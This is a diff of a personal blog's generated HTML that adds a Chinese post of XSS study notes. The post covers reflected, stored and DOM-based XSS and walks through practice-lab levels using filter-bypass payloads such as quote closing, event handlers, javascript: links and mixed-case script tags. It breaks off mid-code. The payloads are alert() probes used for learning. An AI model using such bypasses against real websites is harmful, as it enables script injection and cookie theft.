@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/page/2/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/02/13/xss/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,15 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive - Hexo</title>
+  <title>xss - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/page/2/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="http://example.com/2025/02/13/xss/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS笔记前言在命令执行之后，我选择开始XSS的学习，主要是因为其他人也在学，我不能一意孤行，那样的话就不容易偏移轨道，话说他妈的我心理健康给重修了，没想到第一学期就寄了，又要花时间去刷学习通，妈的傻逼学校，学习通没刷完就不准我参加考试 1.XSS漏洞原理1.概述XSS被称为跨站脚本攻击（Cross Site Scripting），由于和层叠样式表（Cascading Style Sheets，C">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-02-13T12:44:12.000Z">
+<meta property="article:modified_time" content="2025-02-20T09:14:31.155Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2168,7 +2172,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2437,7 +2441,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2512,258 +2516,455 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-	  <article id="arc" class="post article white-box reveal shadow floatable blur">
-			
-			
-				
-				
-					
-						
-						<h2>2025</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/13/xss/">
-									<time>02-13</time>
-									
-										xss
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/09/php%E7%89%B9%E6%80%A7/">
-									<time>02-09</time>
-									
-										php特性
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/08/Http/">
-									<time>02-08</time>
-									
-										Http
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/07/ctfshow/">
-									<time>02-07</time>
-									
-										ctfshow
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-									<time>02-05</time>
-									
-										php命令执行
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
-									<time>02-04</time>
-									
-										文件包含漏洞
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/02/01/linux%E5%91%BD%E4%BB%A4/">
-									<time>02-01</time>
-									
-										linux命令
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/">
-									<time>01-21</time>
-									
-										留言板
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/01/15/Buuctf/">
-									<time>01-15</time>
-									
-										Buuctf
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/01/12/sql%E6%B3%A8%E5%85%A5/">
-									<time>01-12</time>
-									
-										sql注入
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/01/03/MySQL/">
-									<time>01-03</time>
-									
-										MySQL
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2025/01/02/Python/">
-									<time>01-02</time>
-									
-										Python
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						
-						<h2>2024</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2024/12/31/PHP/">
-									<time>12-31</time>
-									
-										PHP
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2024/12/30/HTML/">
-									<time>12-30</time>
-									
-										HTML
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2024/12/06/hello-world/">
-									<time>12-06</time>
-									
-										Hello World
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-	  </article>
-	
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/xss/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
+    <meta itemprop="name" content="Hexo">
+    <meta itemprop="description" content="">
+  </span>
+  
+
+
+  
+    <span hidden>
+      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+    </span>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title" itemprop="name headline">
+        xss
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-02-13T20:44:12+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Feb 13, 2025</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="XSS笔记"><a href="#XSS笔记" class="headerlink" title="XSS笔记"></a>XSS笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在命令执行之后，我选择开始XSS的学习，主要是因为其他人也在学，我不能一意孤行，那样的话就不容易偏移轨道，话说<strong>他妈的我心理健康给重修了</strong>，没想到第一学期就寄了，又要花时间去刷学习通，妈的<strong>傻逼学校</strong>，学习通没刷完就不准我参加考试</p>
+<h2 id="1-XSS漏洞原理"><a href="#1-XSS漏洞原理" class="headerlink" title="1.XSS漏洞原理"></a>1.XSS漏洞原理</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>XSS被称为跨站脚本攻击（Cross Site Scripting），由于和层叠样式表（Cascading Style Sheets，CSS）重名，改为XSS。</p>
+<p>主要基于JavaScript语言进行恶意攻击，因为js非常灵活操作html、css、浏览器。</p>
+<h3 id="2-利用执行方式"><a href="#2-利用执行方式" class="headerlink" title="2.利用执行方式"></a>2.利用执行方式</h3><p>利用网页开发时web应用程序对用户输入过滤不足导致将恶意代码注入到网页中，使用户浏览器加载并执行恶意代码，通常是JavaScript类型，也包括java、vbs、flash、html等。</p>
+<p>用户浏览被XSS注入过的网页，浏览器就会解析这段代码，就被攻击了。因为浏览器当中有JavaScript解析器，浏览器不会判断代码是否恶意，只要符合语法规则，就直接解析了。</p>
+<h3 id="3-XSS危害"><a href="#3-XSS危害" class="headerlink" title="3.XSS危害"></a>3.XSS危害</h3><p><strong>盗取cookie</strong></p>
+<p>因为大部分人喜欢将密码储存到浏览器当中，所以黑客一般渗透的时候就会先来浏览器查看已保存的cookie 来盗取各种用户账号</p>
+<p><strong>未授权操作</strong></p>
+<p>js特性很强大，黑客会直接代替用户在html进行各类操作。比如劫持会话，刷流量，执行弹窗广告，还能记录用户的键盘输入。</p>
+<h3 id="4-简单代码"><a href="#4-简单代码" class="headerlink" title="4.简单代码"></a>4.简单代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&quot;XSS&quot;</span>];</span><br><span class="line">etho <span class="string">&quot;&lt;div&gt;&quot;</span>.<span class="variable">$input</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">感觉这就是一句话后门</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-XSS验证"><a href="#5-XSS验证" class="headerlink" title="5.XSS验证"></a>5.XSS验证</h3><p>当在测试页面上提交以下代码，浏览器执行之后会出现弹窗，这是为了验证js代码是否被执行，代码被当做字符串输出在HTML页面上，浏览器当中的JavaScript解析器会根据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(/xss/)&lt;/script&gt;           <span class="comment">#比较常用</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">prompt</span>(<span class="string">&quot;xss&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-XSS漏洞分类"><a href="#2-XSS漏洞分类" class="headerlink" title="2.XSS漏洞分类"></a>2.XSS漏洞分类</h2><h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>非持久型XSS，最容易出现的XSS漏洞。</p>
+<p><strong>原理</strong></p>
+<p>用户在请求某个URL地址时，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码注入到URL，如果服务器端未对URL携带的参数做判断和过滤，直接返回响应页面，那么XSS攻击代码就会被一起传输到用户的浏览器，触发反射型XSS。</p>
+<p>也就是说，在网址上写下恶意代码，让访问者不注意到，然后影响回显页面来搞事</p>
+<p><strong>特点</strong></p>
+<p>非持久性<br>参数脚本<br>js代码在web应用的参数当中：搜索框</p>
+<p>数据流量：浏览器—-&gt;后端—-&gt;浏览器</p>
+<p>实例：</p>
+<p>当用户进行搜索时，返回结果通常包括用户的原始搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行，用户的信息就被窃取了，甚至还可以模拟用户进行一些操作。</p>
+<p>利用URL编码来迷惑</p>
+<img src="/2025/02/13/xss/5155f1f6fa503754bcca8b5b6f3e0c98.png" class="lazyload" data-srcset="/2025/02/13/xss/5155f1f6fa503754bcca8b5b6f3e0c98.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述">
+
+<p>生成短网址，用来掩饰，造成迷惑<img src="/2025/02/13/xss/04884434427c3d874345c78eba4b560d.png" class="lazyload" data-srcset="/2025/02/13/xss/04884434427c3d874345c78eba4b560d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述"></p>
+<h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h3><p><strong>原理</strong></p>
+<p>被保存到服务器上，显示到HTML页面中，经常出现在用户评论的页面，攻击者将XSS代码保存到数据库中，当用户在此访问这个页面时，就会触发并执行XSS代码，窃取用户的敏感信息。</p>
+<p>因为储存并且会把内容回显到网页，所以每次访问网页都会触发并执行XSS代码</p>
+<p><strong>特点</strong></p>
+<p>危害性最大：持久的保存在服务器上<br>持久型XSS<br>js代码不在某个参数中，而是被写进了数据库或文件可以永久保存数据的介质中，如留言板等。</p>
+<p>数据流量走向：浏览器—&gt;后端—&gt;数据库—&gt;后端—&gt;浏览器</p>
+<h3 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3.DOM型XSS"></a>3.DOM型XSS</h3><p><strong>DOM</strong></p>
+<p>DOM（Document Object Model）即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构，树的每个结点表示了一个HTML标签或标签内的文本项。DOM树结构精确地描述了HTML文档中标签间的相互关联性。将HTML或XML文档转化为DOM树的过程称为解析(parse)。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。DOM模型不仅描述了文档的结构，还定义了结点对象的行为，利用对象的方法和属性，可以方便地访问、修改、添加和删除DOM树的结点和内容。</p>
+<p>如果要知道DOM是什么还是太难了，而且没什么用。</p>
+<p><strong>DOM的作用</strong></p>
+<p>通过上面的详细介绍，我想小伙伴们都差不多知道DOM的作用了。就是为了让JavaScript可以对文档中的标签、属性、内容等进行 <strong>访增删改</strong> 操作。</p>
+<p>举几个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//html内容</span></span><br><span class="line">&lt;div&gt;我是div元素&lt;/div&gt;</span><br><span class="line">&lt;p id=<span class="string">&quot;p&quot;</span>&gt;我是p元素&lt;/p&gt;</span><br><span class="line"><span class="comment">//访</span></span><br><span class="line"><span class="keyword">var</span> div = document.<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> p = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">//增</span></span><br><span class="line"><span class="comment">// 创建一个a元素</span></span><br><span class="line"><span class="keyword">var</span> a = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">// 添加到body</span></span><br><span class="line">document.body.<span class="title function_ invoke__">append</span>(a)</span><br><span class="line"><span class="comment">//删</span></span><br><span class="line"><span class="comment">// 移除body中的div子节点</span></span><br><span class="line">document.body.<span class="title function_ invoke__">removeChild</span>(div)</span><br><span class="line"><span class="comment">//改</span></span><br><span class="line">div.innerHTML = <span class="string">&#x27;我修改了div的文本内容&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong></p>
+<p>基于文档对象模型（DOM）的一种漏洞。这种XSS与反射型XSS、存储型XSS有着本质的区别，它的攻击代码不需要服务器解析响应，触发XSS依靠浏览器端的DOM解析，客户端的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。</p>
+<p><strong>特点</strong></p>
+<p>非持久性</p>
+<p>数据流量：URL—&gt;浏览器</p>
+<h2 id="3-XSS-payload"><a href="#3-XSS-payload" class="headerlink" title="3.XSS payload"></a>3.XSS payload</h2><p>受不了了，XSS怎么这么难，而且网上我看到的教程怎么根本看不懂^_^，还有怎么突然要写js了，而且全是以前没见过的操作</p>
+<p>XSS payload我感觉没什么特指，应该指的就是攻击的恶意代码吧，小到一个alert()弹窗，大到直接劫持cookie所以学到什么算什么</p>
+<p>我感觉这个可以先停一下了，先学习一下绕过方式吧，ctfshow上面的题目要公网Ip才可以拦截cookie，所以只能在自己靶场上练绕过了</p>
+<p>payload的话用XSS平台倒是会自动生成一些</p>
+<h2 id="4-绕过方式"><a href="#4-绕过方式" class="headerlink" title="4.绕过方式"></a>4.绕过方式</h2><h3 id="1-level2-闭合"><a href="#1-level2-闭合" class="headerlink" title="1.level2 闭合"></a>1.level2 闭合</h3><p>level1的话没有任何过滤，直接写js就行了，但level2对输入内容进行了转义，导致写入变为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;<span class="title function_">alert</span>(<span class="number">1</span>)&amp;lt;<span class="regexp">/script&amp;gt;相关的结果.&lt;/</span>h2&gt;&lt;center&gt;</span><br><span class="line">不知道转义规则，但可以找到的是直接写入用不了，但是页面存在回显</span><br></pre></td></tr></table></figure>
+
+<p>我们看源码发现</p>
+<img src="/2025/02/13/xss/image-20250217225641733.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250217225641733.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250217225641733">
+
+<p>这个地方未经过滤就写入了，我们直接闭合</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>后面去看源码</p>
+<img src="/2025/02/13/xss/image-20250217230238935.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250217230238935.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250217230238935">
+
+<p>通过htmlspecialchars()函数对输入进行转义</p>
+<p><strong>htmlspecialchars()</strong></p>
+<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 &amp;</li>
+<li>“ （双引号）成为 “</li>
+<li>‘ （单引号）成为 ‘</li>
+<li>&lt; （小于）成为 &lt;</li>
+<li>&gt; （大于）成为 &gt;</li>
+</ul>
+<p><strong>提示：</strong>如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。</p>
+<h3 id="2-level3-事件绕过"><a href="#2-level3-事件绕过" class="headerlink" title="2.level3 事件绕过"></a>2.level3 事件绕过</h3><p>这次全部输入都被转义了，于是题解上出现了事件绕过。</p>
+<p>使用事件就可以在没有&lt;&gt;的情况下触发js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onfocus=javascript:alert(1) &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用了闭合绕过和js伪协议，值得一提的是即使我们拼接的语句存在错误有时候浏览器也能正常执行，但有的错误又会出错。</p>
+<p>我们事件拼接到哪里，触发哪里即可。这次是输入框</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> &#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-level5-插入标签绕过"><a href="#3-level5-插入标签绕过" class="headerlink" title="3.level5 插入标签绕过"></a>3.level5 插入标签绕过</h3><p>level5看直接上源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);<span class="comment">//小写转换函数，将所有字母转换为小写</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这次过滤掉了on和&lt;script，对其进行了简单的替换，但是on就涵盖了所有我已知的事件，所以不能用事件绕过了</p>
+<table>
+<thead>
+<tr>
+<th align="left">事件</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">onchange</td>
+<td align="left">HTML 元素改变</td>
+</tr>
+<tr>
+<td align="left">onclick</td>
+<td align="left">用户点击 HTML 元素</td>
+</tr>
+<tr>
+<td align="left">onmouseover</td>
+<td align="left">鼠标指针移动到指定的元素上时发生</td>
+</tr>
+<tr>
+<td align="left">onmouseout</td>
+<td align="left">用户从一个 HTML 元素上移开鼠标时发生</td>
+</tr>
+<tr>
+<td align="left">onkeydown</td>
+<td align="left">用户按下键盘按键</td>
+</tr>
+<tr>
+<td align="left">onload</td>
+<td align="left">浏览器已完成页面的加载</td>
+</tr>
+</tbody></table>
+<p>还是看题解，发现需要使用<a>标签，这和xss平台上拦截cookie使用的方法相似。我们利用<a>标签的href属性写js代码并闭合，但这种方法必须使&lt;&gt;不被过滤</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/13/xss/image-20250218122522350.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250218122522350.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250218122522350">
+
+<p>前面的闭合符必须闭合，但后面的浏览器会自动作为普通字符处理</p>
+<h3 id="4-level6-大写绕过"><a href="#4-level6-大写绕过" class="headerlink" title="4.level6 大写绕过"></a>4.level6 大写绕过</h3><p>level6的话目测比上一关多过滤了href，还是直接上源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现过滤掉了很多关键字，但比上一关少过滤了大小写，那么直接大写绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCript</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-level7-双写绕过"><a href="#5-level7-双写绕过" class="headerlink" title="5.level7 双写绕过"></a>5.level7 双写绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span 